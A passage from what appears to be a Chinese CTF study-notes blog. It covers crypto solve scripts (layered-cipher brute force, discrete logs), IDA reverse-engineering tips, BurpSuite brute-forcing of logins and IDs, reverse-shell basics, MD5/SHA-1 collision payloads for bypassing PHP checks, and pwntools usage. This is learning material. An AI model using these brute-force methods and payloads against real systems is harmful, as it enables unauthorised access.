(16),否则pad会补齐s为16的倍数,设差为del,那么就会补齐del个del.<br>所以对于前六个加密,我们可以通过判断尾巴是不是16个16来判断解密是否成功.<br>然而对于后两个加密,无论什么长度都不会报错,且没有明显尾巴,考虑分布:对于每次从8个选3个最后拼一起的情况,任意一段加密方式中,连续的ARC不会超过4,所以设置一个上限即可.<br>具体地:如果前6个解密出现了尾巴那么一定是前六个,否则再考虑用ARC4解密.<br>脚本如下(因为原先flag就是16倍数,所以只会补齐16个16,不用管其他状况,如果不减枝挨个算会算一上午都算不出来…):</p><p>PS: <code>for: xx else: xx</code> 是python的语法,意思是如果for循环内没有break就进入else语句中执行.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">tail=<span class="string">b&#x27;\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10&#x27;</span></span><br><span class="line">defunc = [</span><br><span class="line"><span class="keyword">lambda</span> data: AES.new(<span class="string">b&#x27;DEADBEEFcafebabe&#x27;</span>, AES.MODE_ECB).decrypt(data),</span><br><span class="line"><span class="keyword">lambda</span> data: AES.new(<span class="string">b&#x27;deadc0de!@#$%^&amp;*&#x27;</span>, AES.MODE_ECB).decrypt(data),</span><br><span class="line"><span class="keyword">lambda</span> data: DES.new(<span class="string">b&#x27;deadbeef&#x27;</span>, DES.MODE_ECB).decrypt(data),</span><br><span class="line"><span class="keyword">lambda</span> data: DES.new(<span class="string">b&#x27;13572468&#x27;</span>, DES.MODE_ECB).decrypt(data),</span><br><span class="line"><span class="keyword">lambda</span> data: DES3.new(<span class="string">b&#x27;13572468abcdefgh1!2@3#4$&#x27;</span>, DES3.MODE_ECB).decrypt(data),</span><br><span class="line"><span class="keyword">lambda</span> data: DES3.new(<span class="string">b&#x27;qazwsxedcrfvtgbyhnujmik,&#x27;</span>, DES3.MODE_ECB).decrypt(data),</span><br><span class="line"><span class="keyword">lambda</span> data: ARC4.new(<span class="string">b&#x27;never gonna give you up&#x27;</span>).decrypt(data),</span><br><span class="line"><span class="keyword">lambda</span> data: ARC4.new(<span class="string">b&#x27;never gonna let you down&#x27;</span>).decrypt(data)</span><br><span class="line">]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">s,num,pre</span>):</span><br><span class="line"><span class="keyword">if</span> num&gt;<span class="number">5000</span>*<span class="number">3</span>:</span><br><span class="line"><span class="keyword">global</span> cnt</span><br><span class="line">cnt+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> defunc[:<span class="number">6</span>]:</span><br><span class="line">ss=i(s)</span><br><span class="line"><span class="keyword">if</span> ss[-<span class="number">16</span>:]==tail:</span><br><span class="line">dfs(ss[:-<span class="number">16</span>],num+<span class="number">1</span>,<span class="number">4</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> pre&lt;=<span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> defunc[<span class="number">6</span>:]:</span><br><span class="line">ss=i(s)</span><br><span class="line">dfs(ss[:-<span class="number">16</span>],num+<span class="number">1</span>,pre-<span class="number">1</span>)</span><br><span class="line">dfs(ct,<span class="number">1</span>,<span class="number">4</span>)</span><br></pre></td></tr></table></figure><h3 id="task2-2">task2</h3><p>给定一个 $5^m\equiv h\mod p$ ,尝试求出m.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;Spirit&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) &lt; <span class="number">64</span></span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> m, l: m + <span class="built_in">bytes</span>(<span class="number">114</span>*<span class="built_in">bool</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="built_in">len</span>(m)))</span><br><span class="line">unpad = <span class="keyword">lambda</span> m: m[:m.index(<span class="number">0</span>)] <span class="keyword">if</span> <span class="number">0</span> <span class="keyword">in</span> m <span class="keyword">else</span> m</span><br><span class="line"></span><br><span class="line">flag = pad(flag, <span class="number">143</span>)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = ...</span><br><span class="line">g = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;h =&#x27;</span>, <span class="built_in">pow</span>(g, m, p))</span><br><span class="line">h = ...</span><br></pre></td></tr></table></figure><p>这是一个典型的离散对数问题,但是p特别特别大.</p><p>问了管理员才知道,能通过分解p的阶,也就是p-1,得到一堆小因子还有一个特别大的因子,然后通过这些小因子能合成出 $m\equiv y\mod \prod p_i^{x_i}$ ,其中pi可以任意选取(也就是即使一个小因子也是可以合成的,但是一个小因子提供的信息有限).脚本如下:(使用BSGS加快求解)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt,prod</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bsgs</span>(<span class="params">g,h,n,p</span>):</span><br><span class="line">m=isqrt(n)+<span class="number">1</span>  <span class="comment"># 步长</span></span><br><span class="line">baby_steps=defaultdict(<span class="built_in">int</span>)</span><br><span class="line">current=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">baby_steps[current]=j</span><br><span class="line">current=(current*g)%p</span><br><span class="line"><span class="keyword">if</span>(j%<span class="number">100000</span>==<span class="number">0</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;A&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;A&#x27;</span>,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">inv_g_m=<span class="built_in">pow</span>(g,-m,p)</span><br><span class="line">current=h</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span> current <span class="keyword">in</span> baby_steps:</span><br><span class="line">j=baby_steps[current]</span><br><span class="line">x=i*m+j</span><br><span class="line"><span class="keyword">if</span> x&lt;n:</span><br><span class="line"><span class="keyword">return</span> x</span><br><span class="line">current=(current*inv_g_m)%p</span><br><span class="line"><span class="keyword">if</span>(i%<span class="number">100000</span>==<span class="number">0</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;C&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;C&#x27;</span>,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># 如果没有找到解</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_dlog_small_factor</span>(<span class="params">g,h,n,p</span>):</span><br><span class="line"><span class="keyword">return</span> bsgs(g,h,n,p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">p,y,fact</span>):</span><br><span class="line">q=<span class="built_in">max</span>(fact)</span><br><span class="line">small_factors=[f <span class="keyword">for</span> f <span class="keyword">in</span> fact <span class="keyword">if</span> f!=q]</span><br><span class="line"><span class="comment"># 计算所有小因子的乘积N</span></span><br><span class="line">N=prod(small_factors)</span><br><span class="line">residues=[]  <span class="comment"># 存储余数d_i</span></span><br><span class="line">moduli=[]  <span class="comment"># 存储模数n_i</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;计算m mod <span class="subst">&#123;N&#125;</span> (由<span class="subst">&#123;<span class="built_in">len</span>(small_factors)&#125;</span>个小因子组成)&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i,n <span class="keyword">in</span> <span class="built_in">enumerate</span>(small_factors):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;处理因子 <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>/<span class="subst">&#123;<span class="built_in">len</span>(small_factors)&#125;</span>: <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line">M=(p-<span class="number">1</span>)//n</span><br><span class="line">g_n=<span class="built_in">pow</span>(<span class="number">5</span>,M,p)</span><br><span class="line">h_n=<span class="built_in">pow</span>(y,M,p)</span><br><span class="line">d=solve_dlog_small_factor(g_n,h_n,n,p)</span><br><span class="line"><span class="keyword">if</span> d <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;无法求解因子 <span class="subst">&#123;n&#125;</span> 的离散对数&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">residues.append(d)</span><br><span class="line">moduli.append(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;  解得 m ≡ <span class="subst">&#123;d&#125;</span> (mod <span class="subst">&#123;n&#125;</span>)&quot;</span>)</span><br><span class="line"><span class="comment"># 使用中国剩余定理组合所有结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;使用中国剩余定理组合所有同余式...&quot;</span>)</span><br><span class="line">m_mod_N,_=crt(moduli,residues)</span><br><span class="line"><span class="keyword">return</span> m_mod_N</span><br><span class="line"><span class="comment"># 示例使用</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="comment"># 这里需要提供实际的p和y值</span></span><br><span class="line">p=</span><br><span class="line">g=<span class="number">5</span></span><br><span class="line">y=</span><br><span class="line">h=</span><br><span class="line">fact=[]</span><br><span class="line">result=main(p,y,fact)</span><br><span class="line"><span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;m mod N = <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;计算失败&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后我们审计pad函数,发现起会在末尾添加很多 <code>b'r'</code> ,且flag打头是 <code>Spirit&#123;</code> ,这给我们构造等差数列提供了契机,如下(后半段是手搓的):</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">0</span></span><br><span class="line">b=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(...,<span class="number">10</span>**<span class="number">66</span>,...):</span><br><span class="line">ct=long_to_bytes(m+i*prod)</span><br><span class="line"><span class="keyword">if</span> ct.endswith(<span class="string">b&#x27;rrrrrrrrrrrrrrrrrrrrrrrrrr&#x27;</span>):</span><br><span class="line"><span class="keyword">if</span> ct.startswith(<span class="string">b&#x27;Spirit&#123;&#x27;</span>):</span><br><span class="line"><span class="built_in">print</span>(ct)</span><br><span class="line"><span class="comment"># print(i)</span></span><br><span class="line"><span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">a=i</span><br><span class="line"><span class="keyword">elif</span> b==<span class="number">0</span>:</span><br><span class="line">b=i</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b-a)</span><br></pre></td></tr></table></figure><h2 id="JSFuck">JSFuck</h2><p>使用 <code>!+[]()</code> 等几个字符实现全部js功能的加密方式.使用 <code>CPH Judge</code> 套上 <code>console.log()</code> 的壳直接跑.粘贴到浏览器会有很多问题,又是禁止粘贴不明代码又是不信任啥的,怎么跑个代码这么难,死妈浏览器</p><h2 id="抑或加密">抑或加密</h2><p>好像再跑一遍就回去了.</p><h1>Reverse</h1><h2 id="IDA-EXE-ELF">IDA(EXE ELF)</h2><p>用F5查看反汇编的C代码.<br>Shift+F12能查看字符串界面</p><p>IDA反编译的代码大部分可以直接粘到C++去跑,有一个特例: <code>4*i</code> 改成 <code>i</code> 是因为在反编译界面是按字节统计的,但是C++界面是正常的内存下标取址,取址公式不一样导致偏差.</p><p>IDA反编译的代码很原始,数组有可能在反汇编时拆成一堆变量,导致函数传参是数组但是表现为一个参数,发生&quot;RE&quot;.举例:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mov  [ebp+var_20030], 5Ah ; <span class="string">&#x27;Z&#x27;</span>v7[<span class="number">0</span>] = <span class="string">&#x27;Z&#x27;</span>;</span><br><span class="line">mov  [ebp+var_2002C], 4Ah ; <span class="string">&#x27;J&#x27;</span>v7[<span class="number">1</span>] = <span class="string">&#x27;J&#x27;</span>;</span><br><span class="line">mov  [ebp+var_20028], 53h ; <span class="string">&#x27;S&#x27;</span>v8    = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">mov  [ebp+var_20024], 45h ; <span class="string">&#x27;E&#x27;</span>asmv9    = <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line">mov  [ebp+var_20020], 43h ; <span class="string">&#x27;C&#x27;</span>-&gt;v10   = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">mov  [ebp+var_2001C], 61h ; <span class="string">&#x27;a&#x27;</span>tov11   = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">mov  [ebp+var_20018], 4Eh ; <span class="string">&#x27;N&#x27;</span>C++v12   = <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">mov  [ebp+var_20014], 48h ; <span class="string">&#x27;H&#x27;</span>v13   = <span class="string">&#x27;H&#x27;</span>;</span><br><span class="line">mov  [ebp+var_20010], 33h ; <span class="string">&#x27;3&#x27;</span>v14   = <span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">mov  [ebp+var_2000C], 6Eh ; <span class="string">&#x27;n&#x27;</span>v15   = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">mov  [ebp+var_20008], 67h ; <span class="string">&#x27;g&#x27;</span>v16   = <span class="string">&#x27;g&#x27;</span>;</span><br></pre></td></tr></table></figure><p>Shift+F12可以查看字符串区.</p><h3 id="IDA修改源文件">IDA修改源文件</h3><p>在 <code>Edit-Patch peogram-Apply patches to ...</code> 点原程序保存即可.</p><h2 id="Jadx-gui-APK-CLASS">Jadx_gui(APK CLASS)</h2><p>apk函数的main函数位于 <code>xxx.com</code> 里面的 <code>MainXxxx</code> .</p><h2 id="总结">总结</h2><ol><li><p><code>*11110100001010000101111#</code> 有可能是一个迷宫类型的题目.</p></li><li><p>端序:大端序:高位字节存在低地址处,低位字节存在高位地址处.(x86 arm)<br>小端序:高位字节存在高位字节处.(通过网络发送数据进行传输)<br>IDA的数据是大端序(比如 <code>char* arr=0x776F646168LL</code> )需要先转成char,即 <code>wodah</code> 然后再反转成 <code>hadow</code> 才是实际上字符串的样子.</p></li><li><p>常见函数的方向<br><code>strcat(a,b)</code> a&lt;-b 把b字符串加到a字符串末尾<br><code>strcpy(a,b)</code> a&lt;-b<br><code>a=join(b,c)</code> a&lt;-b+c 组合字符串<br><code>fill(a+1,a+1+n,b+1)</code> a&lt;-b</p></li></ol><h1>Web</h1><p>Web低手.</p><h2 id="常用工具">常用工具</h2><p>dissearch路径扫描工具</p><h2 id="常见路径">常见路径</h2><p><code>/var/www/html/xxx.php</code> 一般放到这里意味着公网可访问</p><h2 id="BurpSuite">BurpSuite</h2><ol><li>监听用法:开启本地代理,然后占一个端口.然后启动!,监听那个端口,然后所有经过的流量就都能被监听.(感觉原理是本地部署一个假的VPN网关)</li><li>修改Cookie用法:还是先启动,然后在页面找到Cookie(Raw)然后发送给Repeater,在这里能随意修改,改好之后点击Apply就能获得反应(flag居然这么神奇就出来了)</li><li>爆破id:使用内嵌浏览器,刷新页面收到一个请求,然后暴力枚举id,然后按照返回请求的长度排序,看最长的,然后找到Renderer(渲染器)得到flag.</li><li>爆破密码:同上</li><li>同时爆破密码和用户名:改成集束炸弹攻击</li><li>记得右键改变文件头,不要自己修改,好像会加点东西进去.</li></ol><h2 id="nc">nc</h2><p>netcat指令,Windows有一个nc的实现,用法:cmd套一个nc64.exe<br>然后输入你想连的IP和端口,输入之后没反应,flag呢???<br>实际上你连接计算机之后,你这就是一个小的bash,你要输入指令获得flag.</p><h2 id="反弹shell-SSH反向Shell端口映射">反弹shell SSH反向Shell端口映射</h2><p>你用nc连接,对方主动监听你,监听成功后对方弹一个shell给你,所以是反向shell.</p><p>首先cmd输入 <code>ipconfig</code> 查看自己的局域网ip地址.</p><h2 id="几个需要注意的类型">几个需要注意的类型</h2><p><code>null</code> <code>nan</code> <code>0e18</code> <code>123abc</code> <code>[]</code> <code>&#123;&#125;</code> <code>inf</code></p><p>在JavaScript中这些特别的占位符分别是 <code>NaN</code> <code>undefined</code> <code>null</code> <code>Infinity</code> …</p><h2 id="md5-sha1强碰撞">md5,sha1强碰撞</h2><p><code>md5</code> 强碰撞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAA=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br><span class="line">BBBBBBBB=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure><p><code>SHA-1</code> 强碰撞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAA=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br><span class="line"></span><br><span class="line">BBBBBBBB=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/kuaile1314/p/11968108.html">ref1</a> <a href="https://blog.csdn.net/cosmoslin/article/details/120973888">ref2</a></p><h2 id="pwntools">pwntools</h2><p>使用py脚本远程连接服务器(代替nc指令)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">conn=remote(<span class="string">&#x27;socket.cryptohack.org&#x27;</span>,<span class="number">11112</span>)</span><br><span class="line">conn=remote(<span class="string">&#x27;114.5.1.4&#x27;</span>,<span class="number">11112</span>)</span><br><span class="line">data_to_send = &#123;</span><br><span class="line"><span class="string">&quot;buy&quot;</span>: <span class="string">&quot;flag&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 把json格式转成str格式</span></span><br><span class="line">json_data = json.dumps(data_to_send)</span><br><span class="line">conn.sendline(json_data.encode())<span class="comment"># 发送服务器的格式是byte,所以要encode</span></span><br><span class="line">response = conn.recvline().decode()<span class="comment"># 接收也是byte,转str要decode,recvall()是接收所有信息,recvall会一直接收</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Server response:&quot;</span>, response)</span><br><span class="line">conn.close() <span class="comment"># 关闭连接</span></span><br><span class="line"><span class="comment"># 此外conn还有一个recvuntil(str)判定指定字符串的,可以过滤废话</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *    <span class="comment"># 导入 Pwntools 库</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)    <span class="comment"># 显示详细信息</span></span><br><span class="line">io = remote(host, port)    <span class="comment"># 与远程连接，host 与 port 分别填远程的地址与端口号</span></span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;aaaa&#x27;</span>)    <span class="comment"># 发送字节数据</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;aaaa&#x27;</span>)    <span class="comment"># 发送的数据末尾带上回车（b&#x27;aaaa\n&#x27;）</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;aaaa&#x27;</span>)    <span class="comment"># 接收到 b&#x27;&gt; &#x27; 之后再发送 b&#x27;aaaa&#x27;</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;aaaa&#x27;</span>)    <span class="comment"># 接收到 b&#x27;&gt; &#x27; 之后再发送 b&#x27;aaaa\n&#x27;</span></span><br><span class="line"></span><br><span class="line">io.recv(<span class="number">5</span>)    <span class="comment"># 接收 5 字节</span></span><br><span class="line">io.recvline()    <span class="comment"># 接收一行（接收到回车 b&#x27;\n&#x27; 为止）</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;abcd&#x27;</span>)    <span class="comment"># 接收到 b&#x27;abcd&#x27; 为止</span></span><br><span class="line"></span><br><span class="line">io.interactive()    <span class="comment"># 在终端与远程交互</span></span><br><span class="line"></span><br><span class="line">s=p32(num)<span class="comment"># 将int以小端序表示为bytes</span></span><br><span class="line">num=u32(s)<span class="comment"># 将bytes以小端序解码为int</span></span><br></pre></td></tr></table></figure><p>json交互</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">json_recv</span>():</span><br><span class="line">    line = r.recvline()</span><br><span class="line">    <span class="keyword">return</span> json.loads(line.decode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">json_send</span>(<span class="params">hsh</span>):</span><br><span class="line">    request = json.dumps(hsh).encode()</span><br><span class="line">    r.sendline(request)</span><br></pre></td></tr></table></figure><h2 id="HackBar">HackBar</h2><p>能够自定义好多协议的啥啥东西(http头字段),在这里写一点这么多多多选项都是啥.</p><ul><li>User-Agent 使用什么浏览器</li><li>DNT 希不希望被跟踪(1是不希望)</li><li>X-forwarded for 你上网的原始IP</li><li>Via 好像是服务器代理的url</li><li>Referer 该请求的来源</li></ul><p>然而Flu的hackbar总是莫名其妙卡死</p><h2 id="PHP">PHP</h2><p>php笑传之 <code>Capture Capture Bug</code> ,下文是代码简析.</p><p>show_source(<strong>FILE</strong>) :让背后php代码变得五颜六色,同时展示在前端.<br>include(“a.php”) :插入脚本.<br>/index.php :一个首页面.<br>/index.phps :后缀为phps的是存放php源代码的,但不是所有网站都有.</p><ol><li>url编码:cyberchef的url编码有一个小锅,不会把字母数字也使用url编码,所以要使用burpsuite的编码器进行url编码.同时,浏览器键入的url会进行一层解码,所以记得再加一层</li><li>数字和字符串弱类型比较,如果字符串一定要比数字大可以构造一个比数字大的字符串,然后末尾添一个 <code>a</code> 